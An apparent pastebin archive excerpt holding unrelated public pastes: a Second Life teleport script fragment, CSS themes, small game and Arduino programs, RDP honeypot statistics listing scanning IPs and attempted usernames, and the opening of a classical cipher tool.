                        llPlaySound(""d7fa8e1e-2590-bc31-08a2-5d1096231ddf"", 1.0);
                        llDialog(llGetOwner(), 
                            ""WARNING!!!! WARNING!!! WARNING!!!\n\n""+
                            ""Region Rating of "" + llGetRegionName() + "" Surpasses Safty Setting of "" + tb
                            +  ""\n\nPress \""GO!\"" buttong goto safezone at "" + ts +""."", 
                            [""GO!"" ,""Ok""], 
                            menu_Channel);
                        warningShown = 1;
                    }
                }
            }
        }
    
    }

    // hopped to a new region or crossed a regional boundry
    changed( integer change )
    {

        if(CHANGED_REGION & change)
        {
            if(!(llGetPermissions() & PERMISSION_TELEPORT))
                return;
            // region changed
            DS(""region changed"");
            warningShown = 0;
            
            regionQry = llRequestSimulatorData(llGetRegionName(), DATA_SIM_RATING);
        }
        if(CHANGED_OWNER & change)
        {
            llLinksetDataReset();
            llSay(0, ""Ownership Changed, Resetting to Default Settings."");
            llResetScript();
        }
    }


    touch_start( integer num_detected )
    {
        if(llGetPermissions() & PERMISSION_TELEPORT)
            llResetTime();
    }

    // open menu
    touch( integer num_detected )
    {
        if(!(llGetPermissions() & PERMISSION_TELEPORT))
            return;
        if(llGetTime() > 2 && soundPlayed == 0)
        {
            llPlaySound(""d23c9120-ba77-6c69-5ee1-0529b6e6ad5d"", 1);
            soundPlayed = 1;
            llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
        }
    }

    // panic button pushed taking to safe zone
    touch_end( integer num )
    {
        if(!(llGetPermissions() & PERMISSION_TELEPORT))
            return;
        
        soundPlayed = 0;

        if(llGetTime() < 2)
        {
            vector global;
            vector regional = <128, 128, 20>;
            // panic botton pushed
            llOwnerSay(""Panic Botton Pressed, taking to safe zone."");
            DS(safe_zone_name);
            if(safe_zone_name != """")
            {
                global = safe_zone_global;
                regional = safe_zone_regional;
            }
            else 
            {
                global = default_safe_global;
            }
            DS((string) global);
            DS((string) regional);
#ifndef DEBUG

            llTeleportAgentGlobalCoords(llGetPermissionsKey(), 
            global, 
            regional, 
            ZERO_VECTOR);
           
#endif
        }
    }
}
"
czV1J38B,Everskies CSS *Extras!*,lemontreess,CSS,Monday 6th of May 2024 09:25:48 PM CDT,"/*all attached images are smaller!*/ 
img.attached{
   max-width: 500px !important;
}
/*Bigger text!*/
.ng-star-inserted{
   font-size: 15px;
}
/* images in quotes are even smaller + faded text!*/
blockquote .ng-star-inserted{
   color: #cececea7 !important;
   max-width: 200px !important;
}
/*Changer for all symbol colors*/
I.mdi{
   color: #000000 !important;
}
/* ENTIRE site color editor (allows you to change site theme to other colors than default dark or light!) A little experimental and might not effect everything, lemme know on reddit if it doesn't work in certain places and I'll fix the code!*/
.box-shadow, .rounded, .bg1, .bg0, .list{
   background: #000000 !important;
   border: #000000 !important;
}
/* Gradiant colors for personal theme!*/
.bg5, .b5, div.box-title{
   background-image: linear-gradient(to right, #a663a6, #9bccd5) !important;
   border: #000000 !important;
}
"
LyAFypz8,Dota2 Senate,jayati,C++,Monday 6th of May 2024 08:41:38 PM CDT,"class Solution {
public:
    string predictPartyVictory(string senate) {
        queue<int>dq, rq;
        int n = senate.size();
        for(int i =0 ;i < n;i++)
        {
            if(senate[i] == 'R'){
                rq.push(i);
            }
            else{
                dq.push(i);
            }
        }
        while(!dq.empty() && !rq.empty())
        {
            int ri = rq.front();
            rq.pop();
            int di = dq.front();
            dq.pop();
            if(ri < di)
            {
                rq.push(ri+n);
            }
            else{
                dq.push(di+n);
            }
        }
        if(dq.empty())
        return ""Radiant"";
        else
        return ""Dire"";
    }
};"
tGEQVF83,back ground images animatons,jevixlugya,Python,Monday 6th of May 2024 08:39:12 PM CDT,"<Content>:
    name: 'content'

    MDBoxLayout:
        orientation:'vertical'
        padding:1
        MDTopAppBar:
            title: 'Oluyimba'
            #type_height:'large'
            left_action_items: [['arrow-left', lambda x: root.callback()],['sda2.png', lambda x: None]]
            right_action_items: [['magnify',lambda x:root.searchrecycle(),'search']]
            elevation: 1
            md_bg_color:app.theme_cls.primary_dark
            specific_text_color:1,1,1,1        


           
        ScrollView:
            size:self.size
            id:scroll
            effect_cls: 'ScrollEffect'
            size_hint: 1,1
            bar_width:4
            bar_color:app.theme_cls.primary_color
            MDBoxLayout:
                adaptive_height:True
                orientation:'vertical'
                size_hint_y:None
                height:self.minimum_height
                width:self.minimum_width
                cols:1
                padding:5
                spacing:20
                MDLabel:
                    text:""""
                    id:labelhymn
                    font_size:Factory.Settingsscreen().ids.slid.value
                    #color:app.theme_cls.primary_color
                    adaptive_height:True
                    font_style:'H4'
                    #font_name:'fonts/Roboto-BoldItalic.ttf'
                    bold:True
                   
                MDLabel:
                    text:'                  '    
                MDLabel:
                    text:'                  '

                MDLabel:
                    text: ""...LUGYA.SAMUEL.JEVIX SOFTWARE ...""
                    color: app.theme_cls.primary_dark
                    font_size: 25
                    #font_name:'fonts/Roboto-BlackItalic.ttf'
                    halign:'center'
                    pos_hint:{'center_x':.5,'center_y':.5}
                    bold:True"
0uek2zAA,Everskies CSS,lemontreess,CSS,Monday 6th of May 2024 08:34:18 PM CDT,"/* Basics: background and theme colors!*/

/* Background! Change the link between the ("""") to change the image. If you want the image to fit differently in the background you can change the word ""cover"", to ""contain"" or ""fill""*/
div.background{
   content: url(""https://images.unsplash.com/photo-1562633243-28d2b1556b13?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"");
   object-fit: cover;
}

/* These are for the color of the different buttons! ""Background"" controls the color of the box, ""color"" controls the color of the text, and ""border-color"" is the border color. Change the hexcode (the numbers after the #) to change the color. Right now its just set to black.*/
.bg5, .b5, div.box-title{
   background: #000000 !important; 
   border-color: #000000 !important;
   color: #000000 !important;
}"
WjHNWbZ6,Mining Turtle - Bridge,ToaLetan,Lua,Monday 6th of May 2024 08:10:06 PM CDT,"-- local width, length = 5, 5

local args = {...}

local width = 1
local length = 1
local currentSlot = 1
local paramsMet = false

if (#args == 2) then
    width = tonumber(args[1])
    length = tonumber(args[2])
	paramsMet = true
else
    print('Invalid size, please input width and length as X,Z')
end

if (paramsMet == true) then
	print ('Building bridge with length ' .. length .. '!')

	turtle.select(currentSlot)
	
	for i = 1, length do
		turtle.forward()
		turtle.placeDown()
		turtle.turnLeft()
		turtle.forward()
		turtle.placeDown()
		turtle.turnRight()
		turtle.turnRight()
		turtle.forward()
		turtle.forward()
		turtle.placeDown()
		turtle.turnLeft()
		turtle.turnLeft()
		turtle.forward()
		turtle.turnRight()
	end
end"
A5wERB7w,2024-05-06_stats.json,rdp_snitch,JSON,Monday 6th of May 2024 07:18:17 PM CDT,"{
  ""ip"": {
    ""203.160.55.91"": 123,
    ""194.165.16.11"": 12,
    ""103.232.53.123"": 24,
    ""45.227.254.49"": 6,
    ""193.118.52.78"": 18,
    ""58.218.204.183"": 21,
    ""87.251.75.145"": 12,
    ""123.31.20.85"": 54,
    ""198.235.24.203"": 9,
    ""87.251.75.64"": 3,
    ""157.119.251.94"": 3,
    ""185.170.144.3"": 6,
    ""159.223.34.114"": 3,
    ""205.210.31.212"": 9,
    ""123.56.20.194"": 6,
    ""152.32.197.12"": 3,
    ""94.232.46.148"": 3,
    ""194.169.175.21"": 6,
    ""185.161.248.148"": 3,
    ""45.33.91.123"": 3,
    ""104.152.52.124"": 3,
    ""185.161.248.121"": 18,
    ""64.124.50.139"": 6,
    ""36.91.222.100"": 6,
    ""85.209.11.23"": 3,
    ""14.167.137.207"": 3,
    ""194.165.16.73"": 12,
    ""94.232.45.92"": 9,
    ""103.47.194.128"": 9,
    ""194.165.16.10"": 9,
    ""198.235.24.20"": 9,
    ""187.190.60.112"": 3,
    ""198.235.24.247"": 9
  },
  ""asn"": {
    ""AS55933"": 123,
    ""AS48721"": 33,
    ""AS63737"": 24,
    ""AS267784"": 6,
    ""AS21859"": 18,
    ""AS4134"": 21,
    ""AS208091"": 15,
    ""AS45899"": 57,
    ""AS396982"": 36,
    ""AS135944"": 3,
    ""AS197414"": 6,
    ""AS14061"": 3,
    ""AS37963"": 6,
    ""AS135377"": 3,
    ""AS212482"": 12,
    ""AS209605"": 6,
    ""AS49202"": 21,
    ""AS63949"": 3,
    ""AS14987"": 3,
    ""AS6461"": 6,
    ""AS7713"": 6,
    ""AS57523"": 3,
    ""AS140832"": 9,
    ""AS22884"": 3
  },
  ""isp"": {
    ""Cloudie Limited"": 123,
    ""Flyservers S.A."": 39,
    ""VIETSERVER"": 24,
    ""Zenlayer Inc"": 18,
    ""Chinanet"": 21,
    ""Xhost Internet Solutions LP"": 33,
    ""VietNam Post and Telecom Corporation"": 54,
    ""Google LLC"": 36,
    ""VinhNam Commercial informatics service corporation"": 3,
    ""DigitalOcean, LLC"": 3,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""UAB Host Baltic"": 6,
    ""Kisara LLC"": 21,
    ""Akamai Technologies, Inc."": 3,
    ""Rethem Hosting LLC"": 3,
    ""Zayo Bandwidth"": 6,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Chang Way Technologies Co. Limited"": 3,
    ""VNPT-VNNIC"": 3,
    ""FTECH"": 9,
    ""Total Play Telecomunicaciones SA De CV"": 3
  },
  ""org"": {
    ""Cloudie Limited"": 123,
    ""Flyservers S.A"": 33,
    ""VietServer Services technology company limited"": 24,
    ""UAB Host Baltic"": 6,
    ""Zenlayer Inc"": 18,
    ""Chinanet JS"": 21,
    ""Xhost Internet Solutions"": 15,
    ""Vietnam Posts and Telecommunications Group"": 54,
    ""Palo Alto Networks, Inc"": 36,
    ""VINACIS"": 3,
    ""Xhostis"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Aliyun Computing Co., LTD"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Dmitriy Panchenko"": 12,
    ""EmanuelHosting LTD"": 6,
    ""Kisara LLC"": 21,
    ""Linode"": 3,
    ""Rethem Hosting LLC"": 3,
    ""Microsoft Corporation"": 6,
    ""Telekomunikasi Indonesia"": 6,
    ""Chang Way Technologies Co. Limited"": 3,
    ""VietNam Post and Telecom Corporation"": 3,
    ""Unknown"": 9,
    ""Total Play Telecomunicaciones SA De CV"": 3
  },
  ""regionName"": {
    ""Central and Western District"": 123,
    ""Kaunas"": 39,
    ""Hanoi"": 87,
    ""Vilnius"": 6,
    ""North Holland"": 39,
    ""Jiangsu"": 21,
    ""California"": 36,
    ""Ho Chi Minh"": 6,
    ""Central Singapore"": 3,
    ""Beijing"": 6,
    ""S\u00e3o Paulo"": 3,
    ""Perm Krai"": 12,
    ""Moscow"": 24,
    ""New Jersey"": 3,
    ""Illinois"": 3,
    ""Virginia"": 6,
    ""Jakarta"": 6,
    ""Hidalgo"": 3
  },
  ""country"": {
    ""Hong Kong"": 123,
    ""Lithuania"": 45,
    ""Vietnam"": 93,
    ""The Netherlands"": 39,
    ""China"": 27,
    ""United States"": 48,
    ""Singapore"": 3,
    ""Brazil"": 3,
    ""Russia"": 36,
    ""Indonesia"": 6,
    ""Mexico"": 3
  },
  ""account"": {
    ""2963199753"": 123,
    ""Test"": 54,
    ""hello"": 126,
    ""root"": 18,
    ""Administr"": 36,
    ""nbjXYuxTr"": 3,
    ""sVjufJ"": 3,
    ""kXBOmp"": 3,
    ""AeERpIlaM"": 3,
    ""OeEeWv"": 3,
    ""Fnwfsk"": 3,
    ""Administrator"": 3,
    ""(empty)"": 3,
    ""nmap"": 3,
    ""Domain"": 21,
    ""EBOJTTuio"": 3,
    ""jKqyhn"": 3,
    ""BtTNLn"": 3,
    ""kpACDFg"": 3,
    ""kusqPBeTq"": 3,
    ""shAYhL"": 3,
    ""MexaMV"": 3
  },
  ""keyboard"": {
    ""Unknown"": 426
  },
  ""client_build"": {
    ""Unknown"": 426
  },
  ""client_name"": {
    ""Unknown"": 426
  },
  ""ip_type"": {
    ""hosting"": 195,
    ""Unknown"": 192,
    ""proxy"": 39
  }
}"
3QNVXtxq,2024-05-06_stats.json,rdp_snitch,JSON,Monday 6th of May 2024 07:16:08 PM CDT,"{
  ""ip"": {
    ""203.160.55.91"": 82,
    ""194.165.16.11"": 8,
    ""103.232.53.123"": 16,
    ""45.227.254.49"": 4,
    ""193.118.52.78"": 12,
    ""58.218.204.183"": 14,
    ""87.251.75.145"": 8,
    ""123.31.20.85"": 36,
    ""198.235.24.203"": 6,
    ""87.251.75.64"": 2,
    ""157.119.251.94"": 2,
    ""185.170.144.3"": 4,
    ""159.223.34.114"": 2,
    ""205.210.31.212"": 6,
    ""123.56.20.194"": 4,
    ""152.32.197.12"": 2,
    ""94.232.46.148"": 2,
    ""194.169.175.21"": 4,
    ""185.161.248.148"": 2,
    ""45.33.91.123"": 2,
    ""104.152.52.124"": 2,
    ""185.161.248.121"": 12,
    ""64.124.50.139"": 4,
    ""36.91.222.100"": 4,
    ""85.209.11.23"": 2,
    ""14.167.137.207"": 2,
    ""194.165.16.73"": 8,
    ""94.232.45.92"": 6,
    ""103.47.194.128"": 6,
    ""194.165.16.10"": 6,
    ""198.235.24.20"": 6,
    ""187.190.60.112"": 2,
    ""198.235.24.247"": 6
  },
  ""asn"": {
    ""AS55933"": 82,
    ""AS48721"": 22,
    ""AS63737"": 16,
    ""AS267784"": 4,
    ""AS21859"": 12,
    ""AS4134"": 14,
    ""AS208091"": 10,
    ""AS45899"": 38,
    ""AS396982"": 24,
    ""AS135944"": 2,
    ""AS197414"": 4,
    ""AS14061"": 2,
    ""AS37963"": 4,
    ""AS135377"": 2,
    ""AS212482"": 8,
    ""AS209605"": 4,
    ""AS49202"": 14,
    ""AS63949"": 2,
    ""AS14987"": 2,
    ""AS6461"": 4,
    ""AS7713"": 4,
    ""AS57523"": 2,
    ""AS140832"": 6,
    ""AS22884"": 2
  },
  ""isp"": {
    ""Cloudie Limited"": 82,
    ""Flyservers S.A."": 26,
    ""VIETSERVER"": 16,
    ""Zenlayer Inc"": 12,
    ""Chinanet"": 14,
    ""Xhost Internet Solutions LP"": 22,
    ""VietNam Post and Telecom Corporation"": 36,
    ""Google LLC"": 24,
    ""VinhNam Commercial informatics service corporation"": 2,
    ""DigitalOcean, LLC"": 2,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""UAB Host Baltic"": 4,
    ""Kisara LLC"": 14,
    ""Akamai Technologies, Inc."": 2,
    ""Rethem Hosting LLC"": 2,
    ""Zayo Bandwidth"": 4,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Chang Way Technologies Co. Limited"": 2,
    ""VNPT-VNNIC"": 2,
    ""FTECH"": 6,
    ""Total Play Telecomunicaciones SA De CV"": 2
  },
  ""org"": {
    ""Cloudie Limited"": 82,
    ""Flyservers S.A"": 22,
    ""VietServer Services technology company limited"": 16,
    ""UAB Host Baltic"": 4,
    ""Zenlayer Inc"": 12,
    ""Chinanet JS"": 14,
    ""Xhost Internet Solutions"": 10,
    ""Vietnam Posts and Telecommunications Group"": 36,
    ""Palo Alto Networks, Inc"": 24,
    ""VINACIS"": 2,
    ""Xhostis"": 4,
    ""DigitalOcean, LLC"": 2,
    ""Aliyun Computing Co., LTD"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Dmitriy Panchenko"": 8,
    ""EmanuelHosting LTD"": 4,
    ""Kisara LLC"": 14,
    ""Linode"": 2,
    ""Rethem Hosting LLC"": 2,
    ""Microsoft Corporation"": 4,
    ""Telekomunikasi Indonesia"": 4,
    ""Chang Way Technologies Co. Limited"": 2,
    ""VietNam Post and Telecom Corporation"": 2,
    ""Unknown"": 6,
    ""Total Play Telecomunicaciones SA De CV"": 2
  },
  ""regionName"": {
    ""Central and Western District"": 82,
    ""Kaunas"": 26,
    ""Hanoi"": 58,
    ""Vilnius"": 4,
    ""North Holland"": 26,
    ""Jiangsu"": 14,
    ""California"": 24,
    ""Ho Chi Minh"": 4,
    ""Central Singapore"": 2,
    ""Beijing"": 4,
    ""S\u00e3o Paulo"": 2,
    ""Perm Krai"": 8,
    ""Moscow"": 16,
    ""New Jersey"": 2,
    ""Illinois"": 2,
    ""Virginia"": 4,
    ""Jakarta"": 4,
    ""Hidalgo"": 2
  },
  ""country"": {
    ""Hong Kong"": 82,
    ""Lithuania"": 30,
    ""Vietnam"": 62,
    ""The Netherlands"": 26,
    ""China"": 18,
    ""United States"": 32,
    ""Singapore"": 2,
    ""Brazil"": 2,
    ""Russia"": 24,
    ""Indonesia"": 4,
    ""Mexico"": 2
  },
  ""account"": {
    ""2963199753"": 82,
    ""Test"": 36,
    ""hello"": 84,
    ""root"": 12,
    ""Administr"": 24,
    ""nbjXYuxTr"": 2,
    ""sVjufJ"": 2,
    ""kXBOmp"": 2,
    ""AeERpIlaM"": 2,
    ""OeEeWv"": 2,
    ""Fnwfsk"": 2,
    ""Administrator"": 2,
    ""(empty)"": 2,
    ""nmap"": 2,
    ""Domain"": 14,
    ""EBOJTTuio"": 2,
    ""jKqyhn"": 2,
    ""BtTNLn"": 2,
    ""kpACDFg"": 2,
    ""kusqPBeTq"": 2,
    ""shAYhL"": 2,
    ""MexaMV"": 2
  },
  ""keyboard"": {
    ""Unknown"": 284
  },
  ""client_build"": {
    ""Unknown"": 284
  },
  ""client_name"": {
    ""Unknown"": 284
  },
  ""ip_type"": {
    ""hosting"": 130,
    ""Unknown"": 128,
    ""proxy"": 26
  }
}"
08MabVac,2024-05-06_stats.json,rdp_snitch,JSON,Monday 6th of May 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""203.160.55.91"": 41,
    ""194.165.16.11"": 4,
    ""103.232.53.123"": 8,
    ""45.227.254.49"": 2,
    ""193.118.52.78"": 6,
    ""58.218.204.183"": 7,
    ""87.251.75.145"": 4,
    ""123.31.20.85"": 18,
    ""198.235.24.203"": 3,
    ""87.251.75.64"": 1,
    ""157.119.251.94"": 1,
    ""185.170.144.3"": 2,
    ""159.223.34.114"": 1,
    ""205.210.31.212"": 3,
    ""123.56.20.194"": 2,
    ""152.32.197.12"": 1,
    ""94.232.46.148"": 1,
    ""194.169.175.21"": 2,
    ""185.161.248.148"": 1,
    ""45.33.91.123"": 1,
    ""104.152.52.124"": 1,
    ""185.161.248.121"": 6,
    ""64.124.50.139"": 2,
    ""36.91.222.100"": 2,
    ""85.209.11.23"": 1,
    ""14.167.137.207"": 1,
    ""194.165.16.73"": 4,
    ""94.232.45.92"": 3,
    ""103.47.194.128"": 3,
    ""194.165.16.10"": 3,
    ""198.235.24.20"": 3,
    ""187.190.60.112"": 1,
    ""198.235.24.247"": 3
  },
  ""asn"": {
    ""AS55933"": 41,
    ""AS48721"": 11,
    ""AS63737"": 8,
    ""AS267784"": 2,
    ""AS21859"": 6,
    ""AS4134"": 7,
    ""AS208091"": 5,
    ""AS45899"": 19,
    ""AS396982"": 12,
    ""AS135944"": 1,
    ""AS197414"": 2,
    ""AS14061"": 1,
    ""AS37963"": 2,
    ""AS135377"": 1,
    ""AS212482"": 4,
    ""AS209605"": 2,
    ""AS49202"": 7,
    ""AS63949"": 1,
    ""AS14987"": 1,
    ""AS6461"": 2,
    ""AS7713"": 2,
    ""AS57523"": 1,
    ""AS140832"": 3,
    ""AS22884"": 1
  },
  ""isp"": {
    ""Cloudie Limited"": 41,
    ""Flyservers S.A."": 13,
    ""VIETSERVER"": 8,
    ""Zenlayer Inc"": 6,
    ""Chinanet"": 7,
    ""Xhost Internet Solutions LP"": 11,
    ""VietNam Post and Telecom Corporation"": 18,
    ""Google LLC"": 12,
    ""VinhNam Commercial informatics service corporation"": 1,
    ""DigitalOcean, LLC"": 1,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""UAB Host Baltic"": 2,
    ""Kisara LLC"": 7,
    ""Akamai Technologies, Inc."": 1,
    ""Rethem Hosting LLC"": 1,
    ""Zayo Bandwidth"": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Chang Way Technologies Co. Limited"": 1,
    ""VNPT-VNNIC"": 1,
    ""FTECH"": 3,
    ""Total Play Telecomunicaciones SA De CV"": 1
  },
  ""org"": {
    ""Cloudie Limited"": 41,
    ""Flyservers S.A"": 11,
    ""VietServer Services technology company limited"": 8,
    ""UAB Host Baltic"": 2,
    ""Zenlayer Inc"": 6,
    ""Chinanet JS"": 7,
    ""Xhost Internet Solutions"": 5,
    ""Vietnam Posts and Telecommunications Group"": 18,
    ""Palo Alto Networks, Inc"": 12,
    ""VINACIS"": 1,
    ""Xhostis"": 2,
    ""DigitalOcean, LLC"": 1,
    ""Aliyun Computing Co., LTD"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Dmitriy Panchenko"": 4,
    ""EmanuelHosting LTD"": 2,
    ""Kisara LLC"": 7,
    ""Linode"": 1,
    ""Rethem Hosting LLC"": 1,
    ""Microsoft Corporation"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""Chang Way Technologies Co. Limited"": 1,
    ""VietNam Post and Telecom Corporation"": 1,
    ""Unknown"": 3,
    ""Total Play Telecomunicaciones SA De CV"": 1
  },
  ""regionName"": {
    ""Central and Western District"": 41,
    ""Kaunas"": 13,
    ""Hanoi"": 29,
    ""Vilnius"": 2,
    ""North Holland"": 13,
    ""Jiangsu"": 7,
    ""California"": 12,
    ""Ho Chi Minh"": 2,
    ""Central Singapore"": 1,
    ""Beijing"": 2,
    ""S\u00e3o Paulo"": 1,
    ""Perm Krai"": 4,
    ""Moscow"": 8,
    ""New Jersey"": 1,
    ""Illinois"": 1,
    ""Virginia"": 2,
    ""Jakarta"": 2,
    ""Hidalgo"": 1
  },
  ""country"": {
    ""Hong Kong"": 41,
    ""Lithuania"": 15,
    ""Vietnam"": 31,
    ""The Netherlands"": 13,
    ""China"": 9,
    ""United States"": 16,
    ""Singapore"": 1,
    ""Brazil"": 1,
    ""Russia"": 12,
    ""Indonesia"": 2,
    ""Mexico"": 1
  },
  ""account"": {
    ""2963199753"": 41,
    ""Test"": 18,
    ""hello"": 42,
    ""root"": 6,
    ""Administr"": 12,
    ""nbjXYuxTr"": 1,
    ""sVjufJ"": 1,
    ""kXBOmp"": 1,
    ""AeERpIlaM"": 1,
    ""OeEeWv"": 1,
    ""Fnwfsk"": 1,
    ""Administrator"": 1,
    ""(empty)"": 1,
    ""nmap"": 1,
    ""Domain"": 7,
    ""EBOJTTuio"": 1,
    ""jKqyhn"": 1,
    ""BtTNLn"": 1,
    ""kpACDFg"": 1,
    ""kusqPBeTq"": 1,
    ""shAYhL"": 1,
    ""MexaMV"": 1
  },
  ""keyboard"": {
    ""Unknown"": 142
  },
  ""client_build"": {
    ""Unknown"": 142
  },
  ""client_name"": {
    ""Unknown"": 142
  },
  ""ip_type"": {
    ""hosting"": 65,
    ""Unknown"": 64,
    ""proxy"": 13
  }
}"
1JZ3SB4a,ChatGPT Enemy Detection Script (Untested),Krythic,C#,Monday 6th of May 2024 07:14:37 PM CDT,"using UnityEngine;

public class EnemyDetection : MonoBehaviour
{
    public float detectionRadius = 10f;
    public float moveSpeed = 5f;
    public float rotationSpeed = 180f; // Degrees per second
    public LayerMask targetLayer;

    private Transform player;
    private bool playerDetected = false;

    void Start()
    {
        player = GameObject.FindGameObjectWithTag(""Player"").transform;
    }

    void Update()
    {
        if (!playerDetected)
        {
            // Check if player is within detection radius
            Collider2D[] colliders = Physics2D.OverlapCircleAll(transform.position, detectionRadius, targetLayer);
            foreach (Collider2D collider in colliders)
            {
                if (collider.CompareTag(""Player""))
                {
                    // Player detected, start moving towards and rotating to face the player
                    Debug.Log(""Enemy detected player!"");
                    playerDetected = true;
                    break;
                }
            }
        }
        else
        {
            // Move towards the player
            Vector2 direction = (player.position - transform.position).normalized;
            transform.Translate(direction * moveSpeed * Time.deltaTime);

            // Rotate towards the player
            float angle = Mathf.Atan2(direction.y, direction.x) * Mathf.Rad2Deg;
            Quaternion targetRotation = Quaternion.Euler(new Vector3(0f, 0f, angle - 90f));
            transform.rotation = Quaternion.RotateTowards(transform.rotation, targetRotation, rotationSpeed * Time.deltaTime);
        }
    }

    void OnDrawGizmosSelected()
    {
        // Draw detection radius in Unity editor
        Gizmos.color = Color.red;
        Gizmos.DrawWireSphere(transform.position, detectionRadius);
    }
}
"
6zefB1F9,GPT - MIDI + Chave + Debounce,NicoChan,C++,Monday 6th of May 2024 06:43:47 PM CDT,"#include <MIDI.h>

const int ROWS = 9;  // Número de linhas na matriz
const int COLS = 6;  // Número de colunas na matriz
const int MIDI_CHANNEL = 1;  // Canal MIDI para envio de dados

// Mapeamento das teclas para notas MIDI
const byte NOTE_MAP[ROWS][COLS] = {
  {36, 37, 38, 39, 40, 41},  // Notas da primeira linha
  {42, 43, 44, 45, 46, 47},  // Notas da segunda linha
  {48, 49, 50, 51, 52, 53},  // Notas da terceira linha
  {54, 55, 56, 57, 58, 59},  // Notas da quarta linha
  {60, 61, 62, 63, 64, 65},  // Notas da quinta linha
  {66, 67, 68, 69, 70, 71},  // Notas da sexta linha
  {72, 73, 74, 75, 76, 77},  // Notas da sétima linha
  {78, 79, 80, 81, 82, 83},  // Notas da oitava linha
  {84, 0, 0, 0, 0, 0}         // Última linha, apenas a primeira coluna é usada
};

// Pinos da matriz
const int rowPins[ROWS] = {2, 3, 4, 5, 6, 7, 8, 9, 10};
const int colPins[COLS] = {11, 12, 13, A0, A1, A2};

// Pinos da chave de 3 posições para controlar a oitava
const int octaveSwitchPin1 = A3;
const int octaveSwitchPin2 = A4;

// Variável para armazenar o estado da oitava (0, 1 ou 2)
int octaveState = 1; // Por padrão, configuração normal (oitava 1)

// Array para armazenar o estado atual das teclas
bool keyState[ROWS][COLS];
unsigned long lastDebounceTime[ROWS][COLS] = {0};
unsigned long debounceDelay = 50;

void setup() {
  MIDI.begin(MIDI_CHANNEL);
  
  // Configuração dos pinos
  for (int i = 0; i < ROWS; i++) {
    pinMode(rowPins[i], INPUT_PULLUP);
  }
  for (int i = 0; i < COLS; i++) {
    pinMode(colPins[i], OUTPUT);
    digitalWrite(colPins[i], HIGH);
  }
  pinMode(octaveSwitchPin1, INPUT_PULLUP);
  pinMode(octaveSwitchPin2, INPUT_PULLUP);
}

void loop() {
  // Lê o estado atual das teclas
  readKeys();
  
  // Lê o estado atual da chave de 3 posições
  readOctaveSwitch();

  // Envia eventos MIDI para teclas pressionadas
  sendMIDI();
}

void readKeys() {
  for (int col = 0; col < COLS; col++) {
    // Ativa a coluna
    digitalWrite(colPins[col], LOW);

    // Verifica as linhas para ver se alguma tecla está pressionada
    for (int row = 0; row < ROWS; row++) {
      if (digitalRead(rowPins[row]) == LOW) {
        if ((millis() - lastDebounceTime[row][col]) > debounceDelay) {
          keyState[row][col] = true;
          lastDebounceTime[row][col] = millis();
        }
      } else {
        keyState[row][col] = false;
      }
    }

    // Desativa a coluna
    digitalWrite(colPins[col], HIGH);
  }
}

void readOctaveSwitch() {
  // Lê o estado da chave de 3 posições
  int switch1State = digitalRead(octaveSwitchPin1);
  int switch2State = digitalRead(octaveSwitchPin2);

  // Calcula o estado da oitava
  octaveState = switch1State * 2 + switch2State;
}

void sendMIDI() {
  for (int row = 0; row < ROWS; row++) {
    for (int col = 0; col < COLS; col++) {
      // Verifica se a tecla está pressionada e se é válida
      if (keyState[row][col] && NOTE_MAP[row][col] != 0) {
        // Ajusta a nota MIDI baseada no estado da oitava
        byte adjustedNote = NOTE_MAP[row][col] + (octaveState - 1) * 12;
        
        // Envia uma nota MIDI pressionada
        MIDI.sendNoteOn(adjustedNote, 127, MIDI_CHANNEL);
      } else {
        // Ajusta a nota MIDI baseada no estado da oitava
        byte adjustedNote = NOTE_MAP[row][col] + (octaveState - 1) * 12;
        
        // Envia uma mensagem de desligamento para a nota MIDI liberada
        MIDI.sendNoteOff(adjustedNote, 0, MIDI_CHANNEL);
      }
    }
  }
}
"
mMXwhkBp,cipher_tool,Python253,Python,Monday 6th of May 2024 06:11:29 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: cipher_tool.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script serves as a comprehensive tool for encoding and decoding various classical ciphers.

It offers functionalities for a range of encoding and decoding techniques for the following:

    1: Caesar Cipher:
        - Allows encoding and decoding text by shifting characters a fixed number of positions in the alphabet.

    2: A1Z26 Cipher:
        - For encoding, it converts alphabetic characters into their corresponding numeric positions in the alphabet.
        - During decoding, it reverses this process, converting numeric sequences back into alphabetic characters.
            - Note: Spaces in the encoded text are represented by '0'.

    3: Atbash Cipher:
        - Inverts the alphabet, substituting each letter with its reverse counterpart.

    4: Rail Fence Cipher:
        - Utilizes a transposition technique, encoding text by writing it in a zigzag pattern across a specified number of ""rails"".
          Then it reads off the encoded text row by row to decode to plaintext.

    5: Vigenère Cipher:
        - Employs a keyword to encode text, shifting characters in a repeating pattern based on the keyword's letters.
          Decoding with Vigenère reverses this process, decrypting text based on the keyword.

Requirements:
    - Python 3.x
    - Colorama (install with 'pip install colorama')
    
Usage:
    - Run the script and choose a cipher type by entering the corresponding number.
    - Follow the prompts to enter the text and any required parameters.
    - The script will output the encoded or decoded text.

Additional Notes:
    - For Rail Fence cipher, the number of rails must be a positive integer.
    - For Vigenère cipher, the key should be a string of alphabetic characters.
    - For A1Z26 cipher:
        - When encoding, the input text should consist of alphabetic characters.
        - When decoding, the input text should consist of numeric characters separated by spaces.
""""""

#IMPORTS
from colorama import Fore, Style

# CAESAR CIPHER
def caesar_cipher(text, shift, mode):
    """"""
    Caesar cipher encoding or decoding.

    Args:
        text (str): The text to be encoded or decoded.
        shift (int): The shift value for encoding or decoding.
